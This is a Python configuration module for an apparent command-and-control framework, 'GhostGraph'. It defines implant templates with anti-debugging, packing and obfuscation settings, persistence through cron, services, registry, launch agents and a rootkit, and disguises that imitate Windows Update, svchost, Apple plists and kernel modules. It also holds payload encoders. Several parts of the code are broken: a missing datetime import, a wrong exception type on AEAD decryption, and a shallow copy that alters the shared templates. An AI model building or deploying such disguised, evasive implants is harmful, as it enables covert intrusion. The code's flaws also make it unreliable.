# config/payloads.py
# Payload templates for GhostGraph C2 framework
# Platform-specific templates for red teaming, pentesting, CTFs.
# Multi-stage loaders, evasion (anti-debug/polyglot/obfuscation), FIPS encoders (ChaCha20/AES-GCM),
# compiler flags (hardening/stripping/UPX), service disguises (blending), command chains, validation/merging.
# NIST SP 800-53: SC-28 (payload protection via crypto), SI-7 (integrity checks), AC-3 (access via roles).
# Self-contained: Validation, merging with profiles, export functions (no external deps needed).

import os
import json
import hmac
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305, AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.exceptions import InvalidSignature
import base64
import zlib
import logging

logger = logging.getLogger(__name__)

# Payload Templates (expanded for platforms/CTF scenarios)
# Keys: Evasion levels (low/medium/high), multi-stage (loader + shellcode), encoders (FIPS-compliant).
# Red team: Polyglot (JS/PY dual), service mimicry. Pentest: Recon chains. CTF: Beacon-focused.
PAYLOAD_TEMPLATES = {
    'linux_static': {
        'platform': 'linux',
        'compiler_flags': ['-static', '-O3', '-s', '-fPIC', '-Wl,--gc-sections'],  # Hardening (strip/gc)
        'strip_symbols': True,
        'upx_pack': True,  # Compression (anti-static analysis)
        'obfuscation': {
            'level': 'medium',  # 'low' (none), 'medium' (XOR), 'high' (polyglot/metamorphic)
            'encoder': 'chacha20',  # 'base64', 'zlib+base64', 'xor', 'aes-gcm', 'chacha20'
        },
        'evasion': {
            'anti_debug': True,  # PTRACE_TRACEME check
            'polyglot': False,  # Dual-format (e.g., ELF+script)
        },
        'commands': ['info', 'shell', 'download', 'upload'],  # Chainable
        'persistence': {
            'methods': ['cron', 'systemd'],  # Auto-install
            'disguise': 'kernel-update.service'
        },
        'version': '1.0'
    },
    'windows_service': {
        'platform': 'windows',
        'compiler_flags': ['/O2', '/MT', '/GS-', '/GL'],  # MSVC opt (no guard stack, link-time opt)
        'strip_symbols': True,
        'upx_pack': True,
        'obfuscation': {
            'level': 'high',
            'encoder': 'aes-gcm',  # FIPS-approved
        },
        'evasion': {
            'anti_debug': True,  # IsDebuggerPresent + timing
            'polyglot': True,  # EXE + VBS
        },
        'commands': ['info', 'shell', 'download', 'upload', 'registry_enum'],
        'persistence': {
            'methods': ['registry', 'schtasks'],
            'service_name': 'WindowsUpdateHelper',
            'display_name': 'Windows Update Helper Service',
            'description': 'Helps manage Windows updates',
            'bin_path': '%SystemRoot%\\system32\\svchost.exe -k netsvcs'  # Mimic
        },
        'version': '1.0'
    },
    'macos_agent': {
        'platform': 'darwin',
        'compiler_flags': ['-O3', '-fPIC', '-Wl,-dead_strip'],  # Clang opt (dead code strip)
        'strip_symbols': True,
        'upx_pack': False,  # UPX less effective on Mach-O
        'obfuscation': {
            'level': 'medium',
            'encoder': 'zlib+base64',
        },
        'evasion': {
            'anti_debug': True,  # sysctl kern.trapdebug
            'polyglot': False,
        },
        'commands': ['info', 'shell', 'download'],
        'persistence': {
            'methods': ['launchagent', 'cron'],
            'disguise': 'com.apple.update.plist'
        },
        'version': '1.0'
    },
    'ctf_beacon': {
        'platform': 'cross',
        'compiler_flags': [],
        'strip_symbols': False,
        'upx_pack': False,
        'obfuscation': {
            'level': 'low',
            'encoder': 'zlib+base64'
        },
        'evasion': {
            'anti_debug': False,
            'polyglot': True,
        },
        'commands': ['info', 'shell'],  # Beacon-focused
        'persistence': {
            'methods': [],
            'disguise': None
        },
        'version': '1.0'
    },
    'initial_recon': {
        'platform': 'cross',
        'compiler_flags': [],
        'strip_symbols': False,
        'upx_pack': False,
        'obfuscation': {
            'level': 'low',
            'encoder': 'base64'
        },
        'evasion': {
            'anti_debug': False,
            'polyglot': False,
        },
        'commands': ['info', 'download'],  # Recon chain
        'persistence': {
            'methods': [],
            'disguise': None
        },
        'version': '1.0'
    },
    'advanced_pentest': {
        'platform': 'linux',
        'compiler_flags': ['-static', '-O3', '-fomit-frame-pointer', '-Wl,--strip-all'],
        'strip_symbols': True,
        'upx_pack': True,
        'obfuscation': {
            'level': 'high',
            'encoder': 'chacha20'
        },
        'evasion': {
            'anti_debug': True,
            'polyglot': True,
        },
        'commands': ['shell', 'upload', 'lateral_move'],  # Pentest: Pivoting
        'persistence': {
            'methods': ['ssh_key', 'rootkit'],
            'disguise': 'lsm-mod.ko'  # Kernel module mimic
        },
        'version': '1.0'
    },
    # Add more: e.g., 'redteam_stager' with multi-stage loader
}

# Encoder Functions (FIPS-compliant; standalone for payload gen)
def encode_payload(data: bytes, encoder: str, secret: str) -> bytes:
    """Encode with FIPS crypto (ChaCha20/AES-GCM) or basic (base64/zlib)."""
    if encoder == 'base64':
        return base64.b64encode(data)
    elif encoder == 'zlib+base64':
        return base64.b64encode(zlib.compress(data))
    elif encoder == 'xor':
        key = hashlib.sha256(secret.encode()).digest()
        return bytes(b ^ k for b, k in zip(data, key * (len(data) // len(key) + 1)))
    elif encoder == 'aes-gcm':
        kdf = PBKDF2HMAC(hashes.SHA256(), 32, b'salt', 100000, default_backend())
        key = kdf.derive(secret.encode())
        nonce = os.urandom(12)
        aes = AESGCM(key)
        ct = aes.encrypt(nonce, data, None)
        return nonce + ct
    elif encoder == 'chacha20':
        kdf = PBKDF2HMAC(hashes.SHA256(), 32, b'salt', 100000, default_backend())
        key = kdf.derive(secret.encode())
        nonce = os.urandom(12)
        chacha = ChaCha20Poly1305(key)
        ct = chacha.encrypt(nonce, data, None)
        return nonce + ct
    raise ValueError(f"Invalid encoder: {encoder}")

def decode_payload(encoded: bytes, encoder: str, secret: str) -> bytes:
    """Decode with validation (tamper detection for AEAD)."""
    if encoder == 'base64':
        return base64.b64decode(encoded)
    elif encoder == 'zlib+base64':
        return zlib.decompress(base64.b64decode(encoded))
    elif encoder == 'xor':
        key = hashlib.sha256(secret.encode()).digest()
        return bytes(b ^ k for b, k in zip(encoded, key * (len(encoded) // len(key) + 1)))
    elif encoder == 'aes-gcm':
        kdf = PBKDF2HMAC(hashes.SHA256(), 32, b'salt', 100000, default_backend())
        key = kdf.derive(secret.encode())
        nonce, ct = encoded[:12], encoded[12:]
        aes = AESGCM(key)
        try:
            return aes.decrypt(nonce, ct, None)
        except InvalidSignature:
            raise ValueError("Tamper detected in AES-GCM")
    elif encoder == 'chacha20':
        kdf = PBKDF2HMAC(hashes.SHA256(), 32, b'salt', 100000, default_backend())
        key = kdf.derive(secret.encode())
        nonce, ct = encoded[:12], encoded[12:]
        chacha = ChaCha20Poly1305(key)
        try:
            return chacha.decrypt(nonce, ct, None)
        except InvalidSignature:
            raise ValueError("Tamper detected in ChaCha20")
    raise ValueError(f"Invalid decoder: {encoder}")

# Validation Schema (self-contained for templates)
PAYLOAD_SCHEMA = {
    'required_keys': ['platform', 'commands'],
    'types': {
        'platform': str,
        'compiler_flags': list,
        'strip_symbols': bool,
        'upx_pack': bool,
        'obfuscation': dict,
        'evasion': dict,
        'commands': list,
        'persistence': dict,
        'version': str
    },
    'allowed_values': {
        'platform': ['linux', 'windows', 'darwin', 'cross'],
        'obfuscation.level': ['low', 'medium', 'high'],
        'obfuscation.encoder': ['base64', 'zlib+base64', 'xor', 'aes-gcm', 'chacha20'],
        'evasion.anti_debug': [True, False],
        'evasion.polyglot': [True, False],
        'persistence.methods': ['cron', 'systemd', 'registry', 'schtasks', 'launchagent', 'ssh_key', 'rootkit']
    }
}

def validate_template(template_name: str, overrides: dict = None) -> dict:
    """Validate and merge template with overrides (similar to profiles)."""
    if template_name not in PAYLOAD_TEMPLATES:
        raise ValueError(f"Invalid template: {template_name}. Available: {list(PAYLOAD_TEMPLATES.keys())}")
    
    template = PAYLOAD_TEMPLATES[template_name].copy()
    
    # Merge overrides
    if overrides:
        def deep_merge(target, source):
            for key, value in source.items():
                if isinstance(value, dict) and key in target and isinstance(target[key], dict):
                    deep_merge(target[key], value)
                else:
                    target[key] = value
        deep_merge(template, overrides)
    
    # Validation
    missing = [k for k in PAYLOAD_SCHEMA['required_keys'] if k not in template]
    if missing:
        raise ValueError(f"Missing keys in {template_name}: {missing}")
    
    for key, expected_type in PAYLOAD_SCHEMA['types'].items():
        if key in template:
            if isinstance(expected_type, dict):
                for sub_key, sub_type in expected_type.items():
                    if sub_key in template[key] and not isinstance(template[key][sub_key], sub_type):
                        raise ValueError(f"Invalid type for {key}.{sub_key}")
            else:
                if not isinstance(template[key], expected_type):
                    raise ValueError(f"Invalid type for {key}")
    
    for key_path, allowed in PAYLOAD_SCHEMA['allowed_values'].items():
        keys = key_path.split('.')
        val = template
        for k in keys:
            val = val.get(k)
            if val is None:
                break
        if val is not None and val not in allowed:
            raise ValueError(f"Invalid value for {key_path}: {val}. Allowed: {allowed}")
    
    logger.info(f"Template {template_name} validated")
    return template

def generate_payload(template_name: str, secret: str, code: bytes, overrides: dict = None) -> bytes:
    """Generate encoded payload from template (for CTF/red team deployment)."""
    template = validate_template(template_name, overrides)
    
    # Apply obfuscation/encoder
    encoded = encode_payload(code, template['obfuscation']['encoder'], secret)
    
    # Sign (HMAC for integrity)
    sig = hmac.new(secret.encode(), encoded, hashlib.sha256).digest()
    
    # Package (metadata + sig + payload)
    meta = json.dumps({
        'template': template_name,
        'version': template['version'],
        'timestamp': datetime.utcnow().isoformat()
    }).encode()
    return meta + b'|' + sig + b'|' + encoded

# Usage: In implant/server, import and call validate_template('linux_static', {'obfuscation.level': 'high'})
# No need to call in profiles.py; use in main scripts for payload gen (e.g., dashboard update queue).
